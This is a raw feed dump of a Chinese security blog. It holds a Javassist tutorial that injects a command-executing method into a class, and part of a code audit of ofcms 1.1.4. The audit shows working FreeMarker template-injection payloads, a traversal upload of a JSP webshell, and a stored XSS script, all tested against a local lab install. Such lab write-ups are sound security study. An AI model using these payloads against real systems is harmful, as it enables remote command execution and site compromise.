java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.AccessFlag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CannotCompileException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NotFoundException &#123;</span><br><span class="line"><span class="comment">//        获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 创建一个自定义类classdemo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;cc2.classdemo2&quot;</span>);</span><br><span class="line">        <span class="comment">// 实现序列化接口</span></span><br><span class="line">        ctClass.setInterfaces(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;classPool.makeInterface(<span class="string">&quot;java.io.Serializable&quot;</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加一个int类型的成员变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;id&quot;</span>, ctClass);</span><br><span class="line">        id.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">        ctClass.addField(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加一个String类型的成员变量</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(classPool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        <span class="comment">// 将id设置为public</span></span><br><span class="line">        name.setModifiers(AccessFlag.PUBLIC);</span><br><span class="line">        <span class="comment">// 将该name属性添加给atClass</span></span><br><span class="line">        ctClass.addField(name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加无参构造方法</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor1</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public classdemo2()&#123;&#125;;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor1);</span><br><span class="line">        <span class="comment">//添加有参构造方法</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public classdemo2(int id,String name)&#123;this.id = id;this.name=name;&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addConstructor(ctConstructor);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加一个方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public void calcmethod()&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>,ctClass);</span><br><span class="line">        <span class="comment">// 将该方法添加给ctClass</span></span><br><span class="line">        ctClass.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//添加get类方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">getid_method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public int getid()&#123;return this.id;&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(getid_method);</span><br><span class="line">        <span class="comment">//添加get类方法</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">getname_method</span> <span class="operator">=</span> CtNewMethod.make(<span class="string">&quot;public String getname()&#123;return this.name;&#125;&quot;</span>, ctClass);</span><br><span class="line">        ctClass.addMethod(getname_method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 写入磁盘</span></span><br><span class="line">        <span class="comment">// 转换为字节流</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="comment">// 方法一：使用writefile指定绝对路径写入磁盘</span></span><br><span class="line"><span class="comment">//        ctClass.writeFile(&quot;D:\\projects\\java\\java1\\src\\main\\java&quot;);</span></span><br><span class="line">        <span class="comment">// 方法二：使用FileOutputStream写入磁盘</span></span><br><span class="line">        <span class="comment">// System.getProperties(&quot;user.dir&quot;) 定位到的当前用户目录(&quot;user.dir&quot;)（即工程根目录）</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.dir&quot;</span>), <span class="string">&quot;/src/main/java/cc2/&quot;</span>),<span class="string">&quot;classdemo2.class&quot;</span>);   <span class="comment">// 这个和上面的make不同，这里是类的位置以及文件名</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        fileOutputStream.write(bytes);</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 验证</span></span><br><span class="line">        <span class="comment">// 调用classdemo的方法</span></span><br><span class="line">        <span class="comment">// 获取javassist的Classloader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader</span>(classPool);</span><br><span class="line">        <span class="comment">// 加载该class文件</span></span><br><span class="line">        Class&lt;?&gt; aClass = loader.loadClass(<span class="string">&quot;cc2.classdemo2&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过无参构造创建对象,反射调用该方法</span></span><br><span class="line"><span class="comment">//        aClass.getDeclaredMethod(&quot;calcmethod&quot;).invoke(aClass.newInstance());</span></span><br><span class="line">        <span class="comment">//通过有参构造方法创建对象，反射调用该方法</span></span><br><span class="line">        Constructor&lt;?&gt; constructor = aClass.getConstructor(<span class="type">int</span>.class, String.class);</span><br><span class="line">        <span class="comment">//创建对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(<span class="number">555</span>, <span class="string">&quot;Sk1y&quot;</span>);</span><br><span class="line">        <span class="comment">//反射调用</span></span><br><span class="line">        System.out.println(aClass.getDeclaredMethod(<span class="string">&quot;getid&quot;</span>).invoke(o));</span><br><span class="line">        System.out.println(aClass.getDeclaredMethod(<span class="string">&quot;getname&quot;</span>).invoke(o));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024084732743.png" alt="image-20221024084732743"></p><h2 id="功能二：动态获取类方法"><a href="#功能二：动态获取类方法" class="headerlink" title="功能二：动态获取类方法"></a>功能二：动态获取类方法</h2><p>一般步骤</p><ol><li>获取默认类池<code>ClassPool classPool = ClassPool.getDefault();</code></li><li>获取目标类<code>CtClass ctClass = classPool.get(&quot;cc2.demo&quot;);</code></li><li>获取类的方法<code>CtMethod hello = ctClass.getDeclaredMethod(&quot;hello&quot;);</code></li><li>插入任意代码<code>hello.insertBefore(&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;);</code></li><li>转换为class对象<code>Class c = ctClass.toClass();</code></li><li>反射调用对象<code>demo o = (demo)aClass.newInstance();</code></li><li>执行方法<code>o.hello();</code></li></ol><p>首先整一个测试类demo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello world!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024091218990.png" alt="image-20221024091218990"></p><p>test_javassist2.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">// 获取默认类池</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">// 获取目标类 cc2.demo</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc2.demo&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取类的方法hello</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">hello</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="comment">// 插入任意代码，这里插入的是calc</span></span><br><span class="line">        hello.insertBefore(<span class="string">&quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 转换为class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> ctClass.toClass();</span><br><span class="line">        <span class="comment">// 实例化demo对象</span></span><br><span class="line">        <span class="type">demo</span> <span class="variable">o</span> <span class="operator">=</span> (demo)aClass.newInstance();    <span class="comment">//强制转换，创建demo类对象</span></span><br><span class="line">        <span class="comment">// 调用hello方法，发现会调用calc</span></span><br><span class="line">        o.hello();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果，调用hello方法，会弹计算器</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024092714149.png" alt="image-20221024092714149"></p><h2 id="功能三：动态获取类信息"><a href="#功能三：动态获取类信息" class="headerlink" title="功能三：动态获取类信息"></a>功能三：动态获取类信息</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_javassist3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//        System.out.println(classPool);</span></span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(test_javassist3.class.getClass()));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;cc2.demo&quot;</span>);</span><br><span class="line">        System.out.println(ctClass.getName());  <span class="comment">//获取类名</span></span><br><span class="line">        System.out.println(ctClass.getSimpleName());    <span class="comment">//获取类名</span></span><br><span class="line">        System.out.println(ctClass.getSuperclass().getName());  <span class="comment">//超类</span></span><br><span class="line">        System.out.println(Arrays.toString(ctClass.getInterfaces()));   <span class="comment">//获取接口</span></span><br><span class="line">        <span class="keyword">for</span> (CtConstructor constructor : ctClass.getConstructors()) &#123;</span><br><span class="line">            System.out.println(constructor);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (CtMethod method : ctClass.getMethods()) &#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221024094652669.png" alt="image-20221024094652669"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人感觉javassist很神奇，通常我们生成class文件，是通过对java文件进行编译生成的，但是有了javassist之后，就可以直接动态生成class文件。</p><p>除此之外，动态获取类方法，把一个安全的类方法，通过<code>insertBefore</code>可以插入任意恶意代码，进行命令执行。不过限制在于需要有javassist这个依赖。</p><p>在学习过程中，看到了nice0e3师傅关于免杀的一些想法，学到了学到了🐂，文章链接在<code>参考链接3</code></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.cnblogs.com/CoLo/p/15383642.html">Java之Javassist动态编程 - Zh1z3ven - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/top_code/article/details/51708043">(2条消息) Java动态编程之javassist_Ricky_Fung的博客-CSDN博客</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/13811335.html#0x03-%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%83%B3%E6%B3%95">Java安全之Javassist动态编程 - nice_0e3 - 博客园 (cnblogs.com)</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javassist </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ofcms1.1.4 内容管理系统代码审计</title>
      <link href="/2022/10/18/ofcms1-1-4-%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2022/10/18/ofcms1-1-4-%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>环境配置保姆级教程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Alexz__/article/details/116229266</span><br></pre></td></tr></table></figure><ol><li><p>git加载项目</p></li><li><p>maven设置</p></li></ol><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221016160413719.png" alt="image-20221016160413719"></p><ol start="3"><li><p>然后maven重新加载项目</p></li><li><p>配置tomcat</p></li></ol><p>注意<code>url</code>和<code>application context</code>是一致的</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017095339170.png" alt="image-20221017095339170"></p><p>deployment</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017095420383.png" alt="image-20221017095420383"></p><ol start="5"><li>数据库配置</li></ol><p>新建数据库，注意mysql驱动，我下载驱动失败，使用的是本地maven仓库的驱动</p><p>解决办法：<a href="https://blog.csdn.net/fan521dan/article/details/104902294">(9条消息) IDEA连接Mysql失败：下载驱动失败，Failed todownload Cannot download Read timed out_疯狂的帆的博客-CSDN博客</a></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017084958316.png" alt="image-20221017084958316"></p><p>导入数据库</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017093755923.png" alt="image-20221017093755923"></p><p>选择之前创建的ofcms_database，run</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017093829444.png" alt="image-20221017093829444"></p><p>查看数据库，可以看到初始化成功</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017094125072.png" alt="image-20221017094125072"></p><p>启动，在<code>localhost:8080/ofcms_admin</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017112007508.png" alt="image-20221017112007508"></p><p>然后配置之后（数据库这里我删除了，然后又整了一遍）</p><p>经过一段时间的加载，估计两三分钟，显示如下</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017113103682.png" alt="image-20221017113103682"></p><h2 id="关于ofcms目录简析"><a href="#关于ofcms目录简析" class="headerlink" title="关于ofcms目录简析"></a>关于ofcms目录简析</h2><p><a href="https://blog.csdn.net/Alexz__/article/details/116272080">(9条消息) 从OFCMS出发，浅析JavaWeb项目技术结构及其功能_Alexz__的博客-CSDN博客</a></p><p><code>Alexz__</code>师傅的分析</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017113932206.png" alt="image-20221017113932206"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>模板注入</p><p>首先需要了解freemarker模板注入</p><p><a href="https://www.cnblogs.com/Eleven-Liu/p/12747908.html">FreeMarker模板注入实现远程命令执行 - Eleven_Liu - 博客园 (cnblogs.com)</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017192511608.png" alt="image-20221017192511608"></p><p>点击<code>联系我们</code>，弹计算器</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017192624277.png" alt="image-20221017192624277"></p><p>查看pom.xml，其中含有freemarker</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017192831167.png" alt="image-20221017192831167"></p><p>该模板设置–&gt;模板文件对应的文件是<code>ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\cms\TemplateController.java</code></p><p>这里获取file_content采用的是getParameter函数.</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017200507366.png" alt="image-20221017200507366"></p><p>贴一些找的payload</p><p>1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freemarker.template.utility里面有个Execute类，如下图所示，这个类会执行它的参数，因此我们可以利用<span class="keyword">new</span>函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。</span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">freemarker.template.utility里面有个ObjectConstructor类，如下图所示，这个类会把它的参数作为名称，构造了一个实例化对象。因此我们可以构造一个可执行命令的对象，从而构造远程命令执行漏洞。</span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="keyword">new</span>()&gt;$&#123;value(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="string">&quot;calc.exe&quot;</span>).start()&#125;</span><br></pre></td></tr></table></figure><p>3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">没成功</span><br><span class="line">freemarker.template.utility里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。</span><br><span class="line">&lt;#assign value=<span class="string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="keyword">new</span>()&gt;&lt;<span class="meta">@value</span>&gt;<span class="keyword">import</span> os;os.system(<span class="string">&quot;calc.exe&quot;</span>)&lt;/<span class="meta">@value</span>&gt;</span><br></pre></td></tr></table></figure><p>4</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><p>5</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">没成功</span><br><span class="line">[#ftl][#assign value= <span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="keyword">new</span>()]$&#123; value(<span class="string">&quot;calc.exe&quot;</span>)&#125;</span><br></pre></td></tr></table></figure><h3 id="任意文件上传漏洞"><a href="#任意文件上传漏洞" class="headerlink" title="任意文件上传漏洞"></a>任意文件上传漏洞</h3><p>还是之前的<code>ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\cms\TemplateController.java</code>对应的save()函数</p><p>分析函数，会接受dirs,file_name,file_content,分别对应上传的路径，文件名，文件内容，并且没有添加过滤！！！，所以可以上传jsp木马</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">resPath</span> <span class="operator">=</span> getPara(<span class="string">&quot;res_path&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">pathFile</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;res&quot;</span>.equals(resPath))&#123;</span><br><span class="line">        pathFile = <span class="keyword">new</span> <span class="title class_">File</span>(SystemUtile.getSiteTemplateResourcePath());</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        pathFile = <span class="keyword">new</span> <span class="title class_">File</span>(SystemUtile.getSiteTemplatePath());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">dirName</span> <span class="operator">=</span> getPara(<span class="string">&quot;dirs&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (dirName != <span class="literal">null</span>) &#123;</span><br><span class="line">        pathFile = <span class="keyword">new</span> <span class="title class_">File</span>(pathFile, dirName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> getPara(<span class="string">&quot;file_name&quot;</span>);</span><br><span class="line">    <span class="comment">// 没有用getPara原因是，getPara因为安全问题会过滤某些html元素。</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> getRequest().getParameter(<span class="string">&quot;file_content&quot;</span>);</span><br><span class="line">    fileContent = fileContent.replace(<span class="string">&quot;&amp;lt;&quot;</span>, <span class="string">&quot;&lt;&quot;</span>).replace(<span class="string">&quot;&amp;gt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(pathFile, fileName);</span><br><span class="line">    FileUtils.writeString(file, fileContent);</span><br><span class="line">    rendSuccessJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包，修改dirs为<code>../../../static</code>，file_name为<code>shell.jsp</code>，file_content为<code>jsp一句话木马的url编码</code></p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018160027581.png" alt="image-20221018160027581"></p><p>生成一句话木马</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221018160036734.png" alt="image-20221018160036734"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/ofcms_admin/static/shell.jsp?cmd=whoami</span><br></pre></td></tr></table></figure><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>在用户评论处存在存储型xss漏洞，无需登录后台</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我随便找了一个公司新闻的地方</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017212920373.png" alt="image-20221017212920373"></p><p>提交评论</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017212850331.png" alt="image-20221017212850331"></p><p>效果如下</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017212813153.png" alt="image-20221017212813153"></p><p>存储型xss</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221017213014315.png" alt="image-20221017213014315"></p><p>源码分析</p><p>对应的源码<code>ofcms-api\src\main\java\com\ofsoft\cms\api\v1\CommentApi.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span 